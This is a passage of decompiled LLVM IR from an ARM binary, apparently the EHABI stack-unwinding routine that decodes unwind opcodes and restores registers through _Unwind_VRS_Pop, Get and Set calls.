  store i32 %v0_18a78, i32* %v2_18a78, align 4
  br label %dec_label_pc_18a7c

dec_label_pc_18a7c:                               ; preds = %.thread3, %dec_label_pc_18a5c
  %v0_18a7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18a7c, i32* %r3.global-to-local, align 4
  %v3_18a80 = mul i32 %v0_18a7c, 256
  store i32 %v3_18a80, i32* %r0.global-to-local, align 4
  %v1_18a84 = load i32, i32* @r5, align 4
  %v2_18a84 = inttoptr i32 %v1_18a84 to i32*
  store i32 %v3_18a80, i32* %v2_18a84, align 4
  %v0_18a88 = load i32, i32* %r3.global-to-local, align 4
  %v3_18a88 = udiv i32 %v0_18a88, 16777216
  br label %dec_label_pc_18a8c

dec_label_pc_18a8c:                               ; preds = %dec_label_pc_18a4c, %dec_label_pc_18a7c
  %storemerge133 = phi i32 [ %v3_18a88, %dec_label_pc_18a7c ], [ 176, %dec_label_pc_18a4c ]
  %v1_18a8c = load i32, i32* %ip.global-to-local, align 4
  %v4_18a8c = mul i32 %v1_18a8c, 256
  %v5_18a8c = or i32 %v4_18a8c, %storemerge133
  store i32 %v5_18a8c, i32* %r2.global-to-local, align 4
  %v7_18a90 = icmp eq i32 %v5_18a8c, 32768
  store i1 %v7_18a90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a90, label %dec_label_pc_18c9c, label %dec_label_pc_18a98

dec_label_pc_18a98:                               ; preds = %dec_label_pc_18a8c
  %v3_18a98 = mul i32 %v5_18a8c, 16
  store i32 %v3_18a98, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18aa8 = and i32 %v3_18a98, 65520
  store i32 %v3_18aa8, i32* %r2.global-to-local, align 4
  %v0_18aac = load i32, i32* @r7, align 4
  store i32 %v0_18aac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18ab4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18aac, i32 %v3_18aa8, i32 0, i32 0)
  store i32 %v4_18ab4, i32* %r0.global-to-local, align 4
  %v2_18ab8 = icmp eq i32 %v4_18ab4, 0
  store i1 %v2_18ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ab8, label %dec_label_pc_18ac0, label %dec_label_pc_18c9c

dec_label_pc_18ac0:                               ; preds = %dec_label_pc_18a98
  %v0_18ac0 = load i32, i32* @r5, align 4
  %v1_18ac0 = add i32 %v0_18ac0, 8
  %v2_18ac0 = inttoptr i32 %v1_18ac0 to i8*
  %v3_18ac0 = load i8, i8* %v2_18ac0, align 1
  %v4_18ac0 = zext i8 %v3_18ac0 to i32
  store i32 %v4_18ac0, i32* %r3.global-to-local, align 4
  %v0_18ac4 = load i32, i32* @r4, align 4
  %v1_18ac4 = and i32 %v0_18ac4, 32768
  %v2_18ac4 = icmp eq i32 %v1_18ac4, 0
  store i1 %v2_18ac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ac4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18ac0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18ac0, %bb147
  %v2_18acc = icmp eq i8 %v3_18ac0, 0
  store i1 %v2_18acc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18acc, label %dec_label_pc_18adc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18ad0 = add nsw i32 %v4_18ac0, -1
  store i32 %v2_18ad0, i32* %r3.global-to-local, align 4
  %v2_18ad4 = trunc i32 %v2_18ad0 to i8
  store i8 %v2_18ad4, i8* %v2_18ac0, align 1
  %v0_18ad8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ad8.pr.pr, label %.thread6.dec_label_pc_18adc_crit_edge, label %dec_label_pc_18a08

.thread6.dec_label_pc_18adc_crit_edge:            ; preds = %.thread6
  %v0_18adc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18adc

dec_label_pc_18adc:                               ; preds = %bb148, %.thread6.dec_label_pc_18adc_crit_edge
  %v0_18adc = phi i32 [ %v0_18adc.pre, %.thread6.dec_label_pc_18adc_crit_edge ], [ %v0_18ac0, %bb148 ]
  %v1_18adc = add i32 %v0_18adc, 9
  %v2_18adc = inttoptr i32 %v1_18adc to i8*
  %v3_18adc = load i8, i8* %v2_18adc, align 1
  %v4_18adc = zext i8 %v3_18adc to i32
  store i32 %v4_18adc, i32* %r3.global-to-local, align 4
  %v2_18ae0 = icmp eq i8 %v3_18adc, 0
  store i1 %v2_18ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ae0, label %dec_label_pc_18ae8, label %dec_label_pc_189ec

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18adc, %dec_label_pc_189e0, %dec_label_pc_18a08
  %v0_18ae8 = load i32, i32* @sl, align 4
  %v2_18ae8 = icmp eq i32 %v0_18ae8, 0
  store i1 %v2_18ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ae8, label %dec_label_pc_18bb0, label %bb149

bb149:                                            ; preds = %dec_label_pc_18ae8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18af4

dec_label_pc_18af4:                               ; preds = %bb149, %dec_label_pc_19064, %dec_label_pc_18f04, %dec_label_pc_18d28, %dec_label_pc_18ce0, %dec_label_pc_18c9c, %dec_label_pc_18bb0
  %v1_18afc = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_19064 ], [ 9, %dec_label_pc_18f04 ], [ 9, %dec_label_pc_18d28 ], [ 9, %dec_label_pc_18ce0 ], [ 9, %dec_label_pc_18c9c ], [ %v0_18be4, %dec_label_pc_18bb0 ]
  store i32 %v9_189b8, i32* %r6.global-to-local, align 4
  store i32 %v21_189b8, i32* @lr, align 4
  ret i32 %v1_18afc

dec_label_pc_18b00:                               ; preds = %dec_label_pc_18a24
  %v1_18b00 = mul i32 %v0_18a24, 4
  %v3_18b04 = and i32 %v1_18b00, 252
  store i32 %v3_18b04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18b10 = load i32, i32* @r7, align 4
  store i32 %v0_18b10, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18b18 = add nuw nsw i32 %v3_18b04, 4
  store i32 %v1_18b18, i32* %r6.global-to-local, align 4
  %v5_18b20 = call i32 @_Unwind_VRS_Get(i32 %v0_18b10, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18b24 = load i32, i32* @r4, align 4
  %v1_18b24 = and i32 %v0_18b24, 64
  %v2_18b24 = icmp eq i32 %v1_18b24, 0
  store i1 %v2_18b24, i1* %cpsr_z.global-to-local, align 1
  %v4_18b2c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18b38 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18b38
  %storemerge160.p = select i1 %v2_18b24, i32 %v2_18b38, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_18b2c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18b54 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18b54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189cc.backedge

dec_label_pc_189cc.backedge:                      ; preds = %dec_label_pc_18b00, %dec_label_pc_18b7c, %dec_label_pc_19000, %dec_label_pc_18ccc, %dec_label_pc_18d04, %dec_label_pc_18c84, %dec_label_pc_18ef0
  %v0_189cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_189cc

dec_label_pc_18b5c:                               ; preds = %dec_label_pc_18a2c
  %v7_18b5c = icmp eq i32 %v1_18a2c, 144
  store i1 %v7_18b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b5c, label %dec_label_pc_18b64, label %dec_label_pc_18ca4

dec_label_pc_18b64:                               ; preds = %dec_label_pc_18b5c
  %v1_18b64 = urem i32 %v0_18a24, 16
  store i32 %v1_18b64, i32* %r2.global-to-local, align 4
  %v2_18b68 = icmp eq i32 %v1_18b64, 15
  store i1 %v2_18b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b68, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18b64
  %v8_18b6c = icmp eq i32 %v1_18b64, 13
  store i1 %v8_18b6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18b6c, label %bb154, label %dec_label_pc_18b7c

.thread21:                                        ; preds = %dec_label_pc_18b64
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18c9c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18c9c

dec_label_pc_18b7c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18b88 = load i32, i32* @r7, align 4
  store i32 %v0_18b88, i32* %r0.global-to-local, align 4
  %v5_18b90 = call i32 @_Unwind_VRS_Get(i32 %v0_18b88, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18b98 = load i32, i32* @r7, align 4
  store i32 %v0_18b98, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18ba8 = call i32 @_Unwind_VRS_Set(i32 %v0_18b98, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18ba8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189cc.backedge

dec_label_pc_18bb0:                               ; preds = %dec_label_pc_18ae8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18bc0 = load i32, i32* @r7, align 4
  store i32 %v0_18bc0, i32* %r0.global-to-local, align 4
  %v7_18bc8 = call i32 @_Unwind_VRS_Get(i32 %v0_18bc0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_18bcc = load i32, i32* @r7, align 4
  store i32 %v0_18bcc, i32* %r0.global-to-local, align 4
  %v0_18bd0 = load i32, i32* @sl, align 4
  store i32 %v0_18bd0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_18bd0, i32* %r3.global-to-local, align 4
  %v5_18be0 = call i32 @_Unwind_VRS_Set(i32 %v0_18bcc, i32 %v0_18bd0, i32 15, i32 %v0_18bd0, i8* bitcast (i32* @0 to i8*))
  %v0_18be4 = load i32, i32* @sl, align 4
  store i32 %v0_18be4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18af4

dec_label_pc_18bec:                               ; preds = %dec_label_pc_18de0
  %v7_18bec = icmp eq i32 %v0_18de0, 199
  store i1 %v7_18bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18bec, label %dec_label_pc_18ec0, label %dec_label_pc_18bf4

dec_label_pc_18bf4:                               ; preds = %dec_label_pc_18bec
  %v1_18bf4 = and i32 %v0_18a24, 248
  store i32 %v1_18bf4, i32* %r3.global-to-local, align 4
  %v7_18bf8 = icmp eq i32 %v1_18bf4, 192
  store i1 %v7_18bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18bf8, label %.thread24, label %dec_label_pc_18c10

.thread24:                                        ; preds = %dec_label_pc_18bf4
  %v2_18bfc = urem i32 %v0_18a24, 16
  %v2_18c00 = add nuw nsw i32 %v2_18bfc, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_18c08 = or i32 %v2_18c00, 655360
  store i32 %v2_18c08, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18c10:                               ; preds = %dec_label_pc_18bf4
  %v7_18c10 = icmp eq i32 %v0_18de0, 200
  store i1 %v7_18c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c10, label %dec_label_pc_18e54, label %dec_label_pc_18c18

dec_label_pc_18c18:                               ; preds = %dec_label_pc_18c10
  %v7_18c18 = icmp eq i32 %v0_18de0, 201
  store i1 %v7_18c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c18, label %dec_label_pc_18c20, label %dec_label_pc_18c9c

dec_label_pc_18c20:                               ; preds = %dec_label_pc_18c18
  %v0_18c20 = load i32, i32* @r5, align 4
  %v1_18c20 = add i32 %v0_18c20, 8
  %v2_18c20 = inttoptr i32 %v1_18c20 to i8*
  %v3_18c20 = load i8, i8* %v2_18c20, align 1
  %v4_18c20 = zext i8 %v3_18c20 to i32
  store i32 %v4_18c20, i32* %r3.global-to-local, align 4
  %v2_18c24 = icmp eq i8 %v3_18c20, 0
  store i1 %v2_18c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c24, label %dec_label_pc_18c34, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_18c20
  %v2_18c28 = add nsw i32 %v4_18c20, -1
  store i32 %v2_18c28, i32* %r3.global-to-local, align 4
  %v2_18c2c = trunc i32 %v2_18c28 to i8
  store i8 %v2_18c2c, i8* %v2_18c20, align 1
  %v0_18c30.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c30.pr.pr, label %.thread26.dec_label_pc_18c34_crit_edge, label %dec_label_pc_18c68

.thread26.dec_label_pc_18c34_crit_edge:           ; preds = %.thread26
  %v0_18c34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18c34

dec_label_pc_18c34:                               ; preds = %.thread26.dec_label_pc_18c34_crit_edge, %dec_label_pc_18c20
  %v2_18c4c = phi i32 [ %v0_18c34.pre, %.thread26.dec_label_pc_18c34_crit_edge ], [ %v0_18c20, %dec_label_pc_18c20 ]
  %v1_18c34 = add i32 %v2_18c4c, 9
  %v2_18c34 = inttoptr i32 %v1_18c34 to i8*
  %v3_18c34 = load i8, i8* %v2_18c34, align 1
  %v4_18c34 = zext i8 %v3_18c34 to i32
  store i32 %v4_18c34, i32* %r3.global-to-local, align 4
  %v2_18c38 = icmp eq i8 %v3_18c34, 0
  store i1 %v2_18c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c38, label %dec_label_pc_18c84, label %dec_label_pc_18c48

dec_label_pc_18c48:                               ; preds = %dec_label_pc_18c34
  %v1_18c48 = add nsw i32 %v4_18c34, -1
  store i32 %v1_18c48, i32* %r3.global-to-local, align 4
  %v1_18c4c = trunc i32 %v1_18c48 to i8
  store i8 %v1_18c4c, i8* %v2_18c34, align 1
  %v0_18c50 = load i32, i32* @r5, align 4
  %v1_18c50 = add i32 %v0_18c50, 4
  %v2_18c50 = inttoptr i32 %v1_18c50 to i32*
  %v3_18c50 = load i32, i32* %v2_18c50, align 4
  store i32 %v3_18c50, i32* %r2.global-to-local, align 4
  %v1_18c54 = inttoptr i32 %v3_18c50 to i32*
  %v2_18c54 = load i32, i32* %v1_18c54, align 4
  store i32 %v2_18c54, i32* %r0.global-to-local, align 4
  %v4_18c54 = add i32 %v3_18c50, 4
  store i32 %v4_18c54, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18c54, i32* %v2_18c50, align 4
  %v0_18c60 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c60 = trunc i32 %v0_18c60 to i8
  %v2_18c60 = load i32, i32* @r5, align 4
  %v3_18c60 = add i32 %v2_18c60, 8
  %v4_18c60 = inttoptr i32 %v3_18c60 to i8*
  store i8 %v1_18c60, i8* %v4_18c60, align 1
  %v0_18c64 = load i32, i32* %r0.global-to-local, align 4
  %v1_18c64 = load i32, i32* @r5, align 4
  %v2_18c64 = inttoptr i32 %v1_18c64 to i32*
  store i32 %v0_18c64, i32* %v2_18c64, align 4
  br label %dec_label_pc_18c68

dec_label_pc_18c68:                               ; preds = %.thread26, %dec_label_pc_18c48
  %v0_18c68 = load i32, i32* %r0.global-to-local, align 4
  %v3_18c68 = udiv i32 %v0_18c68, 16777216
  %v1_18c6c = urem i32 %v3_18c68, 16
  %v3_18c70 = mul i32 %v0_18c68, 256
  %v1_18c74 = add nuw nsw i32 %v1_18c6c, 1
  store i32 %v1_18c74, i32* %r1.global-to-local, align 4
  %v1_18c78 = and i32 %v3_18c68, 240
  store i32 %v1_18c78, i32* %r3.global-to-local, align 4
  %v1_18c7c = load i32, i32* @r5, align 4
  %v2_18c7c = inttoptr i32 %v1_18c7c to i32*
  store i32 %v3_18c70, i32* %v2_18c7c, align 4
  %v0_18c80 = load i32, i32* %r1.global-to-local, align 4
  %v1_18c80 = load i32, i32* %r3.global-to-local, align 4
  %v4_18c80 = mul i32 %v1_18c80, 4096
  %v5_18c80 = or i32 %v4_18c80, %v0_18c80
  br label %dec_label_pc_18c84

dec_label_pc_18c84:                               ; preds = %dec_label_pc_18c34, %dec_label_pc_18c68
  %storemerge = phi i32 [ %v5_18c80, %dec_label_pc_18c68 ], [ 720897, %dec_label_pc_18c34 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18c84 = load i32, i32* @r7, align 4
  store i32 %v0_18c84, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18c90 = call i32 @_Unwind_VRS_Pop(i32 %v0_18c84, i32 1, i32 5, i32 5)
  store i32 %v4_18c90, i32* %r0.global-to-local, align 4
  %v2_18c94 = icmp eq i32 %v4_18c90, 0
  store i1 %v2_18c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c94, label %dec_label_pc_189cc.backedge, label %dec_label_pc_18c9c

dec_label_pc_18c9c:                               ; preds = %dec_label_pc_18ee8, %dec_label_pc_18c18, %dec_label_pc_18cf8, %dec_label_pc_1909c, %dec_label_pc_1906c, %dec_label_pc_19048, %dec_label_pc_18ed4, %dec_label_pc_18c84, %dec_label_pc_18a98, %dec_label_pc_18a8c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18af4

dec_label_pc_18ca4:                               ; preds = %dec_label_pc_18b5c
  %v7_18ca4 = icmp eq i32 %v1_18a2c, 160
  store i1 %v7_18ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ca4, label %dec_label_pc_18cac, label %dec_label_pc_18ce8

dec_label_pc_18cac:                               ; preds = %dec_label_pc_18ca4
  %v0_18cac = load i32, i32* %ip.global-to-local, align 4
  %v1_18cac = urem i32 %v0_18cac, 8
  %v1_18cb0 = xor i32 %v1_18cac, 7
  store i32 %v1_18cb0, i32* %r3.global-to-local, align 4
  %v6_18cb8 = lshr i32 4080, %v1_18cb0
  %v1_18cbc = and i32 %v0_18a24, 8
  %v2_18cbc = icmp eq i32 %v1_18cbc, 0
  store i1 %v2_18cbc, i1* %cpsr_z.global-to-local, align 1
  %v1_18cc0 = and i32 %v6_18cb8, 4080
  %tmp155 = mul nuw nsw i32 %v1_18cbc, 2048
  %tmp156 = or i32 %v1_18cc0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18ccc:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1905c.dec_label_pc_18ccc_crit_edge, %bb157, %dec_label_pc_18eb8, %dec_label_pc_18e4c, %dec_label_pc_18dac, %dec_label_pc_18cac
  %v2_18cd4 = phi i32 [ %v2_18dd0, %.thread44 ], [ %v2_18dd8, %bb157 ], [ %v2_18cd4.pre, %dec_label_pc_1905c.dec_label_pc_18ccc_crit_edge ], [ %v2_18c08, %.thread24 ], [ %storemerge130, %dec_label_pc_18eb8 ], [ %storemerge131, %dec_label_pc_18e4c ], [ %storemerge132, %dec_label_pc_18dac ], [ %tmp156, %dec_label_pc_18cac ]
  %v0_18cd0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1905c.dec_label_pc_18ccc_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18eb8 ], [ 3, %dec_label_pc_18e4c ], [ 1, %dec_label_pc_18dac ], [ 0, %dec_label_pc_18cac ]
  %v0_18ccc = load i32, i32* @r7, align 4
  store i32 %v0_18ccc, i32* %r0.global-to-local, align 4
  store i32 %v0_18cd0, i32* %r3.global-to-local, align 4
  %v4_18cd4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18ccc, i32 %v0_18cd0, i32 %v2_18cd4, i32 %v0_18cd0)
  store i32 %v4_18cd4, i32* %r0.global-to-local, align 4
  %v2_18cd8 = icmp eq i32 %v4_18cd4, 0
  store i1 %v2_18cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cd8, label %dec_label_pc_189cc.backedge, label %dec_label_pc_18ce0

dec_label_pc_18ce0:                               ; preds = %dec_label_pc_18ccc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18af4

dec_label_pc_18ce8:                               ; preds = %dec_label_pc_18ca4
  %v7_18ce8 = icmp eq i32 %v1_18a2c, 176
  store i1 %v7_18ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ce8, label %dec_label_pc_18d30, label %dec_label_pc_18cf0

dec_label_pc_18cf0:                               ; preds = %dec_label_pc_18ce8
  %v7_18cf0 = icmp eq i32 %v1_18a2c, 192
  store i1 %v7_18cf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18cf0, label %dec_label_pc_18de0, label %dec_label_pc_18cf8

dec_label_pc_18cf8:                               ; preds = %dec_label_pc_18cf0
  %v1_18cf8 = and i32 %v0_18a24, 248
  store i32 %v1_18cf8, i32* %r3.global-to-local, align 4
  %v7_18cfc = icmp eq i32 %v1_18cf8, 208
  store i1 %v7_18cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18cfc, label %dec_label_pc_18d04, label %dec_label_pc_18c9c

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18cf8
  %v1_18d04 = urem i32 %v0_18a24, 8
  %v1_18d08 = add nuw nsw i32 %v1_18d04, 1
  %v1_18d0c = or i32 %v1_18d08, 524288
  store i32 %v1_18d0c, i32* %r2.global-to-local, align 4
  %v0_18d10 = load i32, i32* @r7, align 4
  store i32 %v0_18d10, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18d1c = call i32 @_Unwind_VRS_Pop(i32 %v0_18d10, i32 1, i32 %v1_18d0c, i32 5)
  store i32 %v4_18d1c, i32* %r0.global-to-local, align 4
  %v2_18d20 = icmp eq i32 %v4_18d1c, 0
  store i1 %v2_18d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d20, label %dec_label_pc_189cc.backedge, label %dec_label_pc_18d28

dec_label_pc_18d28:                               ; preds = %dec_label_pc_18d04
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18af4

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18ce8
  %v0_18d30 = load i32, i32* %ip.global-to-local, align 4
  %v7_18d30 = icmp eq i32 %v0_18d30, 177
  store i1 %v7_18d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d30, label %dec_label_pc_19034, label %dec_label_pc_18d38

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d30
  %v7_18d38 = icmp eq i32 %v0_18d30, 178
  store i1 %v7_18d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d38, label %dec_label_pc_18f0c, label %dec_label_pc_18d40

dec_label_pc_18d40:                               ; preds = %dec_label_pc_18d38
  %v7_18d40 = icmp eq i32 %v0_18d30, 179
  store i1 %v7_18d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d40, label %dec_label_pc_18d48, label %dec_label_pc_18db4

dec_label_pc_18d48:                               ; preds = %dec_label_pc_18d40
  %v0_18d48 = load i32, i32* @r5, align 4
  %v1_18d48 = add i32 %v0_18d48, 8
  %v2_18d48 = inttoptr i32 %v1_18d48 to i8*
  %v3_18d48 = load i8, i8* %v2_18d48, align 1
  %v4_18d48 = zext i8 %v3_18d48 to i32
  store i32 %v4_18d48, i32* %r3.global-to-local, align 4
  %v2_18d4c = icmp eq i8 %v3_18d48, 0
  store i1 %v2_18d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d4c, label %dec_label_pc_18d5c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_18d48
  %v2_18d50 = add nsw i32 %v4_18d48, -1
  store i32 %v2_18d50, i32* %r3.global-to-local, align 4
  %v2_18d54 = trunc i32 %v2_18d50 to i8
  store i8 %v2_18d54, i8* %v2_18d48, align 1
  %v0_18d58.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d58.pr.pr, label %.thread30.dec_label_pc_18d5c_crit_edge, label %dec_label_pc_18d90

.thread30.dec_label_pc_18d5c_crit_edge:           ; preds = %.thread30
  %v0_18d5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %.thread30.dec_label_pc_18d5c_crit_edge, %dec_label_pc_18d48
  %v2_18d74 = phi i32 [ %v0_18d5c.pre, %.thread30.dec_label_pc_18d5c_crit_edge ], [ %v0_18d48, %dec_label_pc_18d48 ]
  %v1_18d5c = add i32 %v2_18d74, 9
  %v2_18d5c = inttoptr i32 %v1_18d5c to i8*
  %v3_18d5c = load i8, i8* %v2_18d5c, align 1
  %v4_18d5c = zext i8 %v3_18d5c to i32
  store i32 %v4_18d5c, i32* %r3.global-to-local, align 4
  %v2_18d60 = icmp eq i8 %v3_18d5c, 0
  store i1 %v2_18d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d60, label %dec_label_pc_18dac, label %dec_label_pc_18d70

dec_label_pc_18d70:                               ; preds = %dec_label_pc_18d5c
  %v1_18d70 = add nsw i32 %v4_18d5c, -1
  store i32 %v1_18d70, i32* %r3.global-to-local, align 4
  %v1_18d74 = trunc i32 %v1_18d70 to i8
  store i8 %v1_18d74, i8* %v2_18d5c, align 1
  %v0_18d78 = load i32, i32* @r5, align 4
  %v1_18d78 = add i32 %v0_18d78, 4
  %v2_18d78 = inttoptr i32 %v1_18d78 to i32*
  %v3_18d78 = load i32, i32* %v2_18d78, align 4
  store i32 %v3_18d78, i32* %r2.global-to-local, align 4
  %v1_18d7c = inttoptr i32 %v3_18d78 to i32*
  %v2_18d7c = load i32, i32* %v1_18d7c, align 4
  store i32 %v2_18d7c, i32* %r0.global-to-local, align 4
  %v4_18d7c = add i32 %v3_18d78, 4
  store i32 %v4_18d7c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18d7c, i32* %v2_18d78, align 4
  %v0_18d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d88 = trunc i32 %v0_18d88 to i8
  %v2_18d88 = load i32, i32* @r5, align 4
  %v3_18d88 = add i32 %v2_18d88, 8
  %v4_18d88 = inttoptr i32 %v3_18d88 to i8*
  store i8 %v1_18d88, i8* %v4_18d88, align 1
  %v0_18d8c = load i32, i32* %r0.global-to-local, align 4
  %v1_18d8c = load i32, i32* @r5, align 4
  %v2_18d8c = inttoptr i32 %v1_18d8c to i32*
  store i32 %v0_18d8c, i32* %v2_18d8c, align 4
  br label %dec_label_pc_18d90

dec_label_pc_18d90:                               ; preds = %.thread30, %dec_label_pc_18d70
  %v0_18d90 = load i32, i32* %r0.global-to-local, align 4
  %v3_18d90 = udiv i32 %v0_18d90, 16777216
  %v1_18d94 = urem i32 %v3_18d90, 16
  %v3_18d98 = mul i32 %v0_18d90, 256
  store i32 %v3_18d98, i32* %r0.global-to-local, align 4
  %v1_18d9c = add nuw nsw i32 %v1_18d94, 1
  store i32 %v1_18d9c, i32* %r2.global-to-local, align 4
  %v1_18da0 = and i32 %v3_18d90, 240
  store i32 %v1_18da0, i32* %r3.global-to-local, align 4
  %v1_18da4 = load i32, i32* @r5, align 4
  %v2_18da4 = inttoptr i32 %v1_18da4 to i32*
  store i32 %v3_18d98, i32* %v2_18da4, align 4
  %v0_18da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18da8 = load i32, i32* %r3.global-to-local, align 4
  %v4_18da8 = mul i32 %v1_18da8, 4096
  %v5_18da8 = or i32 %v4_18da8, %v0_18da8
  br label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %dec_label_pc_18d5c, %dec_label_pc_18d90
  %storemerge132 = phi i32 [ %v5_18da8, %dec_label_pc_18d90 ], [ 720897, %dec_label_pc_18d5c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18db4:                               ; preds = %dec_label_pc_18d40
  %v1_18db4 = and i32 %v0_18a24, 252
  store i32 %v1_18db4, i32* %r3.global-to-local, align 4
  %v7_18db8 = icmp eq i32 %v1_18db4, 180
  store i1 %v7_18db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18db8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_18db4
  %v2_18dbc = urem i32 %v0_18a24, 4
  %v2_18dc4 = add nuw nsw i32 %v2_18dbc, 1
  store i32 2, i32* %r1.global-to-local, align 4
